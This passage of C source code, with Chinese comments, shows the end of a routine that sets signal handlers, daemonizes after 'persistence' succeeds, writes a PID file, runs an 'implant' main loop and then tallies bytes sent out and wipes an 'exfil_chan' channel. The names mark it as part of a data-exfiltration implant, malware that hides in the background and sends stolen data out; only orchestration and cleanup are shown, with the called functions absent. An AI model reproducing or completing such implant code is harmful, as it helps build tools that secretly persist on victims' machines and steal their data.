    sigemptyset(&sa.sa_mask);
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGINT,  &sa, NULL);
    sigaction(SIGHUP,  &sa, NULL);

    /* 5) 后台化（在驻留与接线全部成功之后，失败不会无声消失） */
    if (cfg->daemonize) {
        if (cd_daemonize() != 0) {
            implant_destroy(im);
            cd_sink_close(&sink);
            exfil_chan_wipe(&sink.chan);
            if (out_stats) *out_stats = st;
            return -5;
        }
        cd_write_pid(cfg->pid_path);
    } else if (cfg->pid_path) {
        cd_write_pid(cfg->pid_path);
    }

    /* 6) 主循环 */
    implant_err_t e = implant_run(im);

    const implant_stats_t *is = implant_stats(im);
    if (is) {
        st.batches   = is->batches_done;
        st.frames    = is->frames_total;
    }
    st.bytes_out = sink.bytes_out;
    st.last_err  = e;

    implant_destroy(im);
    g_im = NULL;

    cd_sink_close(&sink);
    exfil_chan_wipe(&sink.chan);

    if (out_stats) *out_stats = st;
    return (e == IMPLANT_OK || e == IMPLANT_STOPPED) ? 0 : -6;
}
